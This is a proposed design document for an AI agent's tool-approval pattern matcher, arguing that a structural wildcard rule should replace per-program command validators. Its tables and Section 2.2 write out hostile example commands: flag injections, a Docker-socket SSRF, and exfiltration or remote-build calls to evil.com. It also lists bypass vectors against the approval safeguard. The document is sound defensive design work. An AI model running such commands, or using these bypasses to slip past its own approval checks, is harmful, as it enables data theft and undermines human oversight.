---
title: "Tool Approval Architecture: Structural Safety Net and Validator Deprecation"
status: proposed
creation-date: "2026-06-26"
authors: [ "@dbernardi" ]
coach: [ ]
approvers: [ ]
owning-stage: "~devops::ai_powered"
participating-stages: []
toc_hide: true
---

{{< engineering/design-document-header >}}

## Executive Summary

The current per-program command validators (`GitValidator`, `NpmValidator`, etc.) exist to answer one question: *"Is this Gateway-generated pattern safe to suggest?"* That question requires per-program allowlists and dangerous-flag denylists — an enumeration that has to stay complete to stay safe, and has already proven incomplete under security review.

This document defines a structural, program-agnostic replacement: two properties of the pattern-matching engine (`CommandPatternMatcher`) that close the flag-injection class of attack without enumerating a single flag, for every program equally. [ADR-010](010_auto_mode_phased_rollout.md) builds auto mode on top of this safety net; this document is where the safety net itself is justified, and where the validators it replaces get retired.

---

## 1. Problem Statement

The current architecture in `ee/app/models/ai/duo_workflows/command_validators/` uses a template method pattern where each program gets its own validator subclass:

```text
Ai::DuoWorkflows::CommandValidators::Base
  |-- GitValidator      (33 allowed subcommands, 8 global options, 16 dangerous flags)
  |-- NpmValidator      (11 allowed subcommands, 7 dangerous flags)
  |-- DockerValidator   (12 allowed subcommands, 12 dangerous flags)
  |-- BundleValidator   (9 allowed subcommands, 6 dangerous flags)
  |-- MakeValidator     (NOT registered — no safe subset)
  |-- CurlValidator     (NOT registered — no safe subset)
```

The AppSec security review on [MR !240933](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/240933) found five bypass vectors in the initial implementation: `make -e=VALUE` (missing from `DANGEROUS_FLAG_PREFIXES`), `curl --unix-socket` (SSRF to the Docker socket, absent from both lists), `docker --network=container:<id>` (namespace-sharing bypass — only `--network=host` was blocked), `curl --next` (an option-reset bypass chaining a benign request with a dangerous one), and a flag-rename regression that made it unclear whether an entry survived a constant rename.

Each is a case where a human curator missed an attack vector. The denylist approach requires perfect, continuously-updated knowledge of every program's flag surface — knowledge that changes with every program release.

The validators exist because the Gateway used to generate pattern suggestions automatically, and something had to answer "is it safe to offer this pattern?" Once pattern suggestions are removed (see [ADR-010 §2.3](010_auto_mode_phased_rollout.md)), that question no longer needs answering the same way — patterns are either written by a user/admin who is declaring their own intent, or generated from a centrally-authored default policy (shipped as the local policy hook's customer-overridable starting content — see [ADR-010 §2.1](010_auto_mode_phased_rollout.md)). The remaining question is narrower: *"can any pattern, however it was written, be exploited through flag injection?"* — and that's a question the pattern-matching engine itself can answer structurally, without knowing anything about the specific program.

---

## 2. Structural Safety Analysis

### 2.1 What `*` Cannot Match

The `*` wildcard in `CommandPatternMatcher` matches exactly one token that does **not** start with `-` (unless past a `--` end-of-options separator). This single constraint closes every bypass found in the AppSec review:

| Attack Vector | Pattern | Command | Blocked? | Why |
|--------------|---------|---------|----------|-----|
| Flag injection | `npm install *` | `npm install --prefix /tmp` | Yes | `--prefix` starts with `-` |
| Config override | `git checkout *` | `git -c core.sshCommand=evil checkout main` | Yes | `-c` isn't matched by `*` after `checkout` |
| Pager RCE | `git log *` | `git log --open-files-in-pager=evil` | Yes | starts with `-` |
| Network redirect | `curl *` | `curl --unix-socket /var/run/docker.sock` | Yes | starts with `-` |
| Option reset | `curl *` | `curl --next --unix-socket ...` | Yes | starts with `-` |
| Privilege escalation | `docker run *` | `docker run --privileged nginx` | Yes | starts with `-` |
| Environment override | `make *` | `make -e SHELL=/bin/evil` | Yes | starts with `-` |

No per-program knowledge is required — the rule doesn't need to know what `--unix-socket` does, only that it looks like a flag.

### 2.2 What `*` Cannot Catch: Positional-Arg Risk

The constraint doesn't protect against risk carried by positional arguments: `npm install evil-package` (lifecycle-script RCE), `docker build https://evil.com/Dockerfile` (remote build), `curl https://evil.com/exfil?data=secrets` (exfiltration), or `make SHELL=/bin/evil` (positional `VAR=value` syntax, which doesn't start with `-` and so isn't excluded).

This is an accepted, explicit tradeoff, not an oversight: whoever wrote the pattern — a user or a centrally-authored default policy — is declaring their own trust judgment about the *program*, not certifying every possible argument to it. That's a materially different trust model than the old one, where the Gateway was recommending a pattern and something had to validate it on the recommender's behalf.

### 2.3 The `**` Prohibition

`**` matches zero or more tokens **including flags**, which completely defeats the safety net (`npm **` would match `npm install --prefix /tmp/evil --script-shell /bin/sh malware`). It is blocked everywhere a pattern can be written — interactive approvals, config files, and any future governance argument patterns — with no opt-out. This is the one constraint no actor in the system, including governance admins, can override.

**No known bypasses.** These two properties (§2.1, §2.3) require zero per-program maintenance because they're properties of the pattern syntax itself, not enumerated knowledge about any given CLI tool.

---

## 3. Validator Deprecation Path

### 3.1 Current Role

The validators (`GitValidator`, `NpmValidator`, etc.) serve as a gate on Gateway-generated pattern suggestions, answering *"is this pattern safe for this program?"* via subcommand allowlists and flag denylists.

### 3.2 Why They Become Unnecessary

Without Gateway-generated patterns, that question is answered instead by three things working together: structural constraints (§2) close flag injection universally; governance ([ADR-009](009_ai_governance.md)) lets an org deny any tool it considers unsafe regardless of what pattern is written; and the pattern's author — user or centrally-authored default policy — is exercising their own judgment rather than rubber-stamping a suggestion. The validators' per-program knowledge (which subcommands are safe, which flags are dangerous) is replaced by structural safety plus explicit authorship — not by a new enumeration effort somewhere else.

### 3.3 Migration

| Phase | Action |
|-------|--------|
| **Phase 1** (now) | Structural safety net ships; validators remain active as defense-in-depth. |
| **Phase 2** | Gateway pattern suggestions removed ([ADR-010](010_auto_mode_phased_rollout.md)). Validators still gate interactive pattern approvals for backward compatibility. |
| **Phase 3** | Interactive pattern suggestions removed from the approval UI entirely. Validators no longer on the critical path; mark as deprecated. |
| **Phase 4** | Remove validator classes, `CommandValidators::Registry`, and related specs. Pattern safety is fully structural + governance. |

Validators do no harm during the transition — they just become redundant once pattern suggestions are gone, and Phase 4 should not proceed until an owner has confirmed (e.g. by comparing validator-catches vs. structural-only catches during Phase 2/3) that removing them causes no coverage loss.

---

## 4. Comparison With the Validator Model

| Security Property | Validator Model | Structural Model |
|-------------------|----------------|---------------------------|
| Flag injection protection | Per-program denylists (incomplete, requires maintenance) | Structural: `*` can't match flags (complete, zero maintenance) |
| Positional-arg risk | Per-program allowlists (blocks dangerous subcommands) | Accepted tradeoff, bounded by the pattern author's own judgment |
| Unknown programs | Fail closed (no pattern approval) | Fail closed (no match → prompt) |
| Bypass risk | High — 5 bypasses found in one review | Low — no per-program edge cases to miss |
| Maintenance burden | Ongoing, unbounded (new programs, new flags) | Near-zero, bounded by pattern syntax, not by CLI surface |
| Coverage | 4 programs out of hundreds | All programs equally |

The positional-arg tradeoff (§2.2) is the one place the validator model was structurally *safer* — it could reject an entire dangerous subcommand outright. That protection is deliberately traded for a model that doesn't require unbounded per-program maintenance to stay correct; governance remains the backstop for orgs that want to reintroduce that restriction at the tool level.

---

## 5. Relationship to Existing ADRs

| ADR | Relationship |
|-----|-------------|
| [006 — Tool Approval](006_tool_approval.md) | **Foundation.** `CommandPatternMatcher` and pattern-based session approvals are the infrastructure this document analyzes; no changes proposed here. |
| [009 — AI Governance](009_ai_governance.md) | **Composed.** Governance remains the tool-name-level organizational ceiling regardless of validator status — unaffected by their deprecation. |
| [010 — Phased Auto Mode Rollout](010_auto_mode_phased_rollout.md) | **Depends on this document.** ADR-010's default policy and Gateway-suggestion removal both rely on the structural safety net (§2) holding regardless of who authors a pattern. This document's validator deprecation path (§3) is the cleanup ADR-010's rollout eventually makes safe to complete. |
